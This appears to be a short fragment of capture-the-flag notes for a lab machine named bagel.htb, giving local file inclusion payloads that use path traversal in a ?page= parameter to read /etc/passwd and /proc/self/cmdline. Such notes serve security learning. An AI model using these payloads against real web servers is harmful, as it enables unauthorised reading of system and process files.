If URL parameter is something like ?page=, try different LFI payloads

```
http://bagel.htb:8000/?page=../../../../../../../etc/passwd
```

Other interesting payloads are:

```
http://bagel.htb:8000/?page=../../../../../../../proc/self/cmdline
```